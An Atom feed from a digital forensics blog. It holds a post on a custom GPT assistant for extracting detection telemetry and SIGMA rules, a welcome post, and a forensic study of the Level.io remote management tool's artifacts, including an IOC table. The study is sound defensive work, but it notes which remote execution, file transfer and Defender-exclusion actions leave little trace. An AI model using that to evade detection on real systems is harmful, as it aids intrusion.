<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://dfirtnt.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://dfirtnt.github.io/" rel="alternate" type="text/html" /><updated>2025-08-22T15:32:18-04:00</updated><id>https://dfirtnt.github.io/feed.xml</id><title type="html">DFIR TNT | Digital Forensics | Incident Response | Tips and Tricks</title><subtitle>Digital Forensics | Incident Response | Tips and Tricks</subtitle><author><name>Andrew Skatoff</name></author><entry><title type="html">Huntable - AI Assistant for Tactical Threat Intel</title><link href="https://dfirtnt.github.io/2025/08/06/huntable-gpt-tactical-threat-intelligence-assistant/" rel="alternate" type="text/html" title="Huntable - AI Assistant for Tactical Threat Intel" /><published>2025-08-06T11:26:59-04:00</published><updated>2025-08-06T11:26:59-04:00</updated><id>https://dfirtnt.github.io/2025/08/06/huntable-gpt-tactical-threat-intelligence-assistant</id><content type="html" xml:base="https://dfirtnt.github.io/2025/08/06/huntable-gpt-tactical-threat-intelligence-assistant/"><![CDATA[## Turning Intel Into Action: My Tactical Threat Intelligence Assistant

Threat reports are everywhere—but most don't help you hunt. Fancy graphics and vague analysis rarely translate into detection logic. You end up scrolling 20 pages, searching for gritty details: command lines, DNS patterns, parent-child process chains.

That's why I built **Huntable GPT**—a small, purpose-built AI assistant that reads threat reports like a practitioner and pulls out what blue-team defenders actually care about.

### What It Does

This isn't a chatty AI. It's not summarizing or over explaining. It's trained to extract technical details that defenders can act on. Everything is filtered through a telemetry-first lens: can we detect this in logs?

* Command-line patterns with full parameters
* Process trees (parent/child relationships)
* Suspicious DNS lookups and DGA patterns
* Proxy log indicators (User-Agents, URL patterns)
* Windows Event IDs and Syslog patterns tied to TTPs

When there's enough context, it even builds tailored SIGMA rules—specific to the threat report, not generic templates.

## Key Capabilities

**Prioritized Intelligence Sources** The assistant focuses on high-quality, technical sources known for detailed analysis – think DFIR Report, Unit42, Mandiant, and CrowdStrike. It knows which sources typically provide the technical depth needed for effective hunting.

**Telemetry-First Approach** Every response includes observables from priority data sources:

* Command-line patterns with exact parameters
* Process execution chains showing parent-child relationships
* DNS queries including DGA patterns and suspicious domains
* Proxy log indicators like specific user-agents and URL patterns
* Windows Event Log correlations with specific Event IDs
* Syslog-based detection opportunities

**SIGMA Rule Generation** When the intelligence supports it, the assistant can generate properly formatted SIGMA rules based on the extracted observables. These aren't generic rules – they're tailored to the specific TTPs found in current threat intelligence.

**Recent Intelligence Focus** The tool prioritizes intelligence from the past 6-12 months, with the ability to search for the most current threat activity. It's designed to keep pace with the rapidly evolving threat landscape.

## Real-World Applications

Here's how we can use the assistant in practice:

**Threat Hunting Preparation** Instead of manually parsing through lengthy APT reports, I can quickly extract the huntable artifacts and get straight to building queries for my threat hunting platform.

**Detection Rule Development** The assistant helps bridge the gap between reading about a technique and actually implementing detection logic. It extracts the specific technical details needed to write effective rules with low false positive rates.

**Intelligence Triage** When multiple threat reports come out about the same campaign, the assistant helps me quickly identify which reports contain the most actionable technical details worth investigating further.

**Hunt Hypothesis Generation** By focusing on telemetry-visible behaviors, the tool helps generate specific hunt hypotheses rather than vague "look for suspicious activity" guidance.

### Getting the Most Out of It

Ask clear, scoped questions like:

* `What's APT29 been doing in cmd.exe the last 6 months?`
* `Got DNS TTPs for current ransomware campaigns?`
* `What proxy indicators are showing up in recent C2 traffic?`
* `Build SIGMA for suspicious Event IDs tied to credential access`

The more focused you are, the better it delivers.

If it gives stale intel, just say so—it often corrects when prompted. Try multiple prompts. Refine. It responds well to iteration.

Here are some prompts that seem to work well! Give them a try and edit to suit your needs!

| **Use Case**                                                                     | **Example / Illustration**                                       |
| -------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| Ask it to focus on a particular telemetry source and/or technique.               | [ChatGPT Share Link](https://chatgpt.com/share/68938488-2034-8002-9e11-db88464cdbf0) |
| Ask it to focus on a particular platform (e.g. MacOS)                            | [ChatGPT Share Link](https://chatgpt.com/share/689383ec-75cc-8002-9e5c-590d2d543a81) |
| Ask it to assess if the SIGMA rules it provided are good or not (e.g. FP prone). | [ChatGPT Share Link](https://chatgpt.com/share/68938393-9384-8002-91ce-ba3d1d3edbe6) |
| Ask it about some novel thing you vaguely remember hearing about.                | [ChatGPT Share Link](https://chatgpt.com/share/68938264-e738-8002-91ce-ba3d1d3edbe6) |
| Try multiple shots. Ask for what you want then ask it to convert to SIGMA.       | [ChatGPT Share Link](https://chatgpt.com/share/6893816a-e358-8002-aec8-757f1f52618b) |

### Final Word

This tool doesn't replace analysis—but hopefully, it speeds it up. Less time reading reports, more time finding evil!

---

_Have you tried building specialized AI assistants for your security workflows? I'd love to hear about your experiences and lessons learned. Feel free to reach out if you have questions about implementing tactical intelligence automation in your environment._]]></content><author><name>Andrew Skatoff</name></author><summary type="html"><![CDATA[## Turning Intel Into Action: My Tactical Threat Intelligence Assistant]]></summary></entry><entry><title type="html">Welcome to DFIR TNT</title><link href="https://dfirtnt.github.io/2025/01/22/welcome-to-dfir-tnt/" rel="alternate" type="text/html" title="Welcome to DFIR TNT" /><published>2025-01-22T00:00:00-05:00</published><updated>2025-01-22T00:00:00-05:00</updated><id>https://dfirtnt.github.io/2025/01/22/welcome-to-dfir-tnt</id><content type="html" xml:base="https://dfirtnt.github.io/2025/01/22/welcome-to-dfir-tnt/"><![CDATA[<table>
  <tbody>
    <tr>
      <td>Welcome to DFIR TNT - Digital Forensics</td>
      <td>Incident Response</td>
      <td>Tips and Tricks!</td>
    </tr>
  </tbody>
</table>

<p>This site is currently being migrated from WordPress to GitHub Pages. More content coming soon!</p>

<h2 id="what-to-expect">What to Expect</h2>

<ul>
  <li>Digital forensics techniques and tools</li>
  <li>Incident response methodologies</li>
  <li>Security analysis tips and tricks</li>
  <li>Technical deep-dives into cyber threats</li>
</ul>

<p>Stay tuned for the full migration!</p>]]></content><author><name>Andrew Skatoff</name></author><category term="DFIR" /><category term="Welcome" /><category term="digital forensics" /><category term="incident response" /><summary type="html"><![CDATA[Welcome to DFIR TNT - Digital Forensics Incident Response Tips and Tricks!]]></summary></entry><entry><title type="html">RMM – Level.io: Forensic Artifacts and Evidence</title><link href="https://dfirtnt.github.io/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/" rel="alternate" type="text/html" title="RMM – Level.io: Forensic Artifacts and Evidence" /><published>2023-09-05T13:48:16-04:00</published><updated>2023-09-05T13:48:16-04:00</updated><id>https://dfirtnt.github.io/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence</id><content type="html" xml:base="https://dfirtnt.github.io/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/"><![CDATA[- Detection
- DFIR
- LOLBAS
- LOLBINS
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<p>Level software is the next RMM tool I wanted to research.  A Crowdstrike threat intelligence <a rel="noreferrer noopener" href="https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/" target="_blank">report </a>mentions this software being abused, but provides little detail. Let's dig in to see what forensic artifacts and telemetry this tool creates to assist incident responders and forensicators. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><em>No thanks. Just take me to the <a href="#iocs-and-ttps">IOCs/TTPs</a>!</em></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td class="has-text-align-center" data-align="center"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-65.png?w=985" alt="" style="width: 300px"></td>
<td class="has-text-align-center" data-align="center"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-67.png?w=1011" alt="" style="width: 300px"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<ol>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#Publisher">Publisher</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#capabilities">Capabilities</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#testing-methods">Testing Methods</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#installation">Installation</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#persistence">Persistence</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#reconnaissance">Reconnaissance</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#application-logs">Application Logs</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#script-command-execution">Script/Command Execution</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#remote-control">Remote Control</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#file-transfer">File Transfer</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#iocs-and-ttps">IOCs and TTPs</a></li>
<li><a class="wp-block-table-of-contents__entry" href="https://dfirtnt.wordpress.com/2023/09/05/rmm-level-io-forensic-artifacts-and-evidence/#foot-notes">Foot Notes</a></li>
</ol>
<p><!-- /wp:table-of-contents --></p>
<p></p>
<h2 class="wp-block-heading" id="Publisher"><strong>Publisher</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Most of the portable executables used by Level are signed by "<strong>Level Software, Inc"</strong>. However, oddly, the main binary level.exe is not signed at all.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2 class="wp-block-heading" id="capabilities"><strong>Capabilities</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Basic RMM features, as expected. However, some novel features include <a rel="noreferrer noopener" href="https://level.io/blog/script-based-monitors" target="_blank">alerting </a>and the somewhat ominous  "Background Management", a clearly attractive option for threat actors (aka silent remote arbitrary code execution). </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-68.png?w=984" alt=""></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-66.png?w=1024" alt="" style="width: 600px"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>They boast fully private P2P connections but this requires some additional setup to get WebRTC to work around your firewall and NAT rules.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-90.png?w=591" alt=""></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-108.png?w=1024" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<h2 class="wp-block-heading" id="testing-methods"><strong>Testing Methods</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>The Level binaries do not contain version information in the Details section of the properties. So we shall have to make do with saying that testing was performed on the PE versions available on 8/25/2023. SHA1 hashes are in the table below.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-69.png?w=648" alt="" class="wp-image-759" style="width:300px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>level.exe</td>
<td>097007FC21856B721EF8C5111B78C2F2D518C43B</td>
</tr>
<tr>
<td>level-remote-control-ffmpeg.exe</td>
<td>A4E83ABBB122BF43752F3649D03EF16799053AE5</td>
</tr>
<tr>
<td>winpty-agent.exe</td>
<td>3F0F3C42CB4A980668F579C66369D6415CB123D2</td>
</tr>
<tr>
<td>osqueryi.exe</td>
<td>1B1FCCF0B80C39F581903044EF1864473EBDFA28</td>
</tr>
<tr>
<td>level-windows-amd64.exe</td>
<td>097007FC21856B721EF8C5111B78C2F2D518C43B</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<h2 class="wp-block-heading" id="installation"><strong>Installation</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>I only performed testing on the Windows client/agent. However, they offer install scripts and support for macOS and Linux. It is noteworthy, the Crowdstrike report indicates their threat actor installed Level on an Esxi appliance. There was no MSI installer offered, but only this simple PowerShell script:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image alignleft size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-70.png?w=1024" alt="" class="wp-image-761" style="width:537px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The API_KEY value is not passed to the web server at this time, but is declared as a variable for a component in the ps1 script.  The following stdout was displayed during the install. As expected the same script was recorded in the PowerShell console history.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-71.png?w=1024" alt="" class="wp-image-764" style="width:548px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The installation process dropped a file in C:\Windows\Temp\ called "level-windows-amd64.exe." Looking at the contents of the ps1 file shows where this came from. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-73.png?w=1024" alt="" class="wp-image-771" style="width:371px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-74.png?w=1024" alt="" class="wp-image-772" style="width:588px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The resultant Url concatenates to <em>https://builds.level.io/stable/level-windows-amd64.exe</em>. Although this binary was no longer on disk, I was able to pull a copy of it from this URL.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The API key was then passed to the exe when it was executed.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-75.png?w=1024" alt="" class="wp-image-776" style="width:826px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The program is not compatible with 32-bit operating systems, and therefore the installation path is found in "C:\Program Files\Level\</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-78.png?w=678" alt="" class="wp-image-781" style="width:221px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>We see the installation process also make changes to the Windows firewall rules to allow any protocol inbound to the level agent. This generates a 2004 event in the Windows Firewall logs.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-79.png?w=1024" alt="" class="wp-image-782" style="width:565px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Upon completion of installation, the web UI shows success and displays the following dashboard:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-76.png?w=1024" alt="" class="wp-image-778" style="width:639px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="persistence"><strong>Persistence</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>The install establishes a service running as local system and establishes a scheduled task to run every 10 minutes to ensure the service is still running. <br>(described here: <a rel="noreferrer noopener" href="https://docs.level.io/1.0/admin-guides/level-watchdog-task" target="_blank">https://docs.level.io/1.0/admin-guides/level-watchdog-task</a>)</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-80.png?w=1024" alt=""></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-81.png?w=1024" alt=""></td>
</tr>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-83.png?w=798" alt=""></td>
<td>
<br><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-82.png?w=1024" alt=""><br>
</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<h2 class="wp-block-heading" id="reconnaissance"><strong>Reconnaissance</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>This is the first RMM tool I've seen using osquery to collect machine state information. A shrewd choice by the company, since all this code is proven and maintained <a href="https://github.com/osquery/osquery">elsewhere</a>. I should note that their version of the osqueryi.exe was signed by LevelSoftware, but I assume it is largely intact from the open-source OSQuery project. The image below compares the sigcheck output from the Level version with the latest build from the OpenSource project:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-84.png?w=1024" alt="" class="wp-image-791" style="width:313px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The OSquery commands are visible in basic process monitoring logs (e.g. Sysmon EventID ==1)</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-87.png?w=1024" alt="" class="wp-image-796" style="width:535px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-85.png?w=1024" alt="" class="wp-image-793"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>In general, they include all the normals (running processes, hardware, software, services, etc). If a threat actor has gotten this far, all this data is leaking. Evidence of the user/group enumeration actions are also found in the security log under EventID == 4798.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-88.png?w=986" alt="" class="wp-image-797" style="width:285px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p class="Network Observables" id="Network-Observables"><strong>Network Observables</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>During the installation the software resolved or contacted the following domains</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-89.png?w=964" alt="" class="wp-image-799" style="width:528px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="application-logs"><strong>Application Logs</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>All application logging I observed was limited to a file called level.log  in the program files directory. The log file captures connection state and evidence of remote terminal and remote control. Very little else of value was found. There are two *.db files in the folder as well, but also contained little I could determine to be useful.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2 class="wp-block-heading" id="script-command-execution"><strong>Script/Command Execution</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>I performed some testing of remote command execution  in the web UI. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-91.png?w=1024" alt="" class="wp-image-804" style="width:484px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Telemetry on the agent side revealed that the winpty-agent.exe is invoked which then spawns a child powershell process. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-92.png?w=1024" alt="" class="wp-image-806" style="width:651px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-95.png?w=1024" alt="" class="wp-image-812" style="width:620px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The Level.log file contains an indication that a terminal was connected as well.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-94.png?w=1024" alt="" class="wp-image-811"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>I also created a custom script to add calc.exe to the exclusion list for Defender AV. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-109.png?w=1024" alt="" class="wp-image-842" style="width:442px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>After executing this on the endpoint, there was little trail to show what happened. Luckily, with PowerShell transcripts running, we have some visibility. A ps1 file is created in the Level program files directory (which was quickly disappeared), and our transcript shows the content of the ps1 script.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-113.png?w=1024" alt="" class="wp-image-848" style="width:504px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>If the location and filename are strong enough evidence, we can pivot on the Process ID or the ps1 filename to see if we can determine the provenance of this script.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-114.png?w=1024" alt="" class="wp-image-850"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading" id="remote-control"><strong>Remote Control</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>A remote control session is easily established with the click of a button in the web UI. Once initiated, level.exe will spawn <em>level-remote-control-ffmpeg.exe</em> as a child process.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-96.png?w=1024" alt="" class="wp-image-814" style="width:392px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-97.png?w=1024" alt="" class="wp-image-815"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Corroborating evidence can be found in the level.log file by searching for the string "Capturing whole desktop".</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-101.png?w=1024" alt="" class="wp-image-822" style="width:459px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><em>Note, this string is also found in the level.exe memory strings.</em></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>User Interaction</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The ability to run scripts, jobs, tasks against the client device without notifying the user is well established. However, the software will popup a notification to the user when the administrator starts a remote GUI sessions. Note, it doesn't not ask the user for permission.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-98.png?w=326" alt="" class="wp-image-817" style="width:154px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>This information is detectable in obfuscated form in command line telemetry.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-99.png?w=1024" alt="" class="wp-image-819" style="width:604px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>If an investigator needed visibility into <strong>who</strong> was connecting in, they could reverse the above base64 string to get the cleartext.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-106.png?w=1024" alt="" class="wp-image-833" style="width:526px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<h2 class="wp-block-heading FileTransfer" id="file-transfer"><strong>File Transfer</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<p><strong>Pushing a file</strong> to the client creates nothing useful in the level.log file. If sysmon is configured to record file creation events, you may observe the activity there. I pushed a file called meeting_saved_chat.txt into C:\Temp</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-102.png?w=1024" alt="" class="wp-image-826" style="width:702px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>I also found the strings in memory for the level.exe process.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-105.png?w=1024" alt="" class="wp-image-831" style="width:471px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Note, this capability also works with file. You can copy a file on your admin machine and send the clipboard data to the client where it can be pasted in to explorer on the client endpoint. No evidence of this was found in level.log.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Pulling a file</strong> from the client left even less evidence. I pulled a file called Baseline.txt from the client device. I was unable to find anything in logs, but I was able to find one small breadcrumb in strings of a procdump of level.exe. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-103.png?w=1024" alt="" class="wp-image-828" style="width:479px;height:auto"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>I tried copying and pasting a file from client to admin machine, and it failed. However, the copy paste operation in that direction worked with ASCII text. No evidence of this was found in level.log.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2 class="wp-block-heading" id="iocs-and-ttps"><strong>IOCs and TTPs</strong></h2>
<p><!-- /wp:heading --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>https://downloads.level.io/install_windows.ps1</td>
<td>Evidence of downloading an installer</td>
</tr>
<tr>
<td>downloads.level.io</td>
<td>contacted by installer level-windows-amd64.exe</td>
</tr>
<tr>
<td>logs.logdna.com<br>builds.level.io<br>downloads.level.io<br>online.level.io</td>
<td>Domain IOCs. Appeared first day of install, prior to taking any Remote Management actions.</td>
</tr>
<tr>
<td>agents.level.io<br>realtime.ably.io<br>rest.ably.io</td>
<td>Only appeared in DNS records when I began testing Remote Management actions.</td>
</tr>
<tr>
<td>winpty-agent.exe</td>
<td>Execution is evidence of remote terminal session. Along with "Terminal/ Start" string in the level.log file.</td>
</tr>
<tr>
<td>level-remote-control-ffmpeg.exe</td>
<td>Execution is evidence of remote control session.</td>
</tr>
<tr>
<td>osqueryi.exe</td>
<td>Execution where signer is "Level Software" and parent process is level.exe</td>
</tr>
<tr>
<td>level.exe</td>
<td>Running as a service. Not signed.</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<h2 class="wp-block-heading" id="foot-notes">Foot Notes</h2>
<p><!-- /wp:heading --></p>
<p></p>
<ol>
</p>
<li>A matrix of RMM tools with links to reporting, research and detection rules is here: <a rel="noreferrer noopener" href="https://bit.ly/RMM_LOLBAS_Matrix" target="_blank">https://bit.ly/RMM_LOLBAS_Matrix</a>
</li>
<p><!-- /wp:list-item -->
</ol>
<p><!-- /wp:list --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="RMM" /><summary type="html"><![CDATA[- Detection - DFIR - LOLBAS - LOLBINS Level software is the next RMM tool I wanted to research. A Crowdstrike threat intelligence report mentions this software being abused, but provides little detail. Let's dig in to see what forensic artifacts and telemetry this tool creates to assist incident responders and forensicators. No thanks. Just take me to the IOCs/TTPs! Publisher Capabilities Testing Methods Installation Persistence Reconnaissance Application Logs Script/Command Execution Remote Control File Transfer IOCs and TTPs Foot Notes Publisher Most of the portable executables used by Level are signed by "Level Software, Inc". However, oddly, the main binary level.exe is not signed at all. Capabilities Basic RMM features, as expected. However, some novel features include alerting and the somewhat ominous "Background Management", a clearly attractive option for threat actors (aka silent remote arbitrary code execution). They boast fully private P2P connections but this requires some additional setup to get WebRTC to work around your firewall and NAT rules. Testing Methods The Level binaries do not contain version information in the Details section of the properties. So we shall have to make do with saying that testing was performed on the PE versions available on 8/25/2023. SHA1 hashes are in the table below. level.exe 097007FC21856B721EF8C5111B78C2F2D518C43B level-remote-control-ffmpeg.exe A4E83ABBB122BF43752F3649D03EF16799053AE5 winpty-agent.exe 3F0F3C42CB4A980668F579C66369D6415CB123D2 osqueryi.exe 1B1FCCF0B80C39F581903044EF1864473EBDFA28 level-windows-amd64.exe 097007FC21856B721EF8C5111B78C2F2D518C43B Installation I only performed testing on the Windows client/agent. However, they offer install scripts and support for macOS and Linux. It is noteworthy, the Crowdstrike report indicates their threat actor installed Level on an Esxi appliance. There was no MSI installer offered, 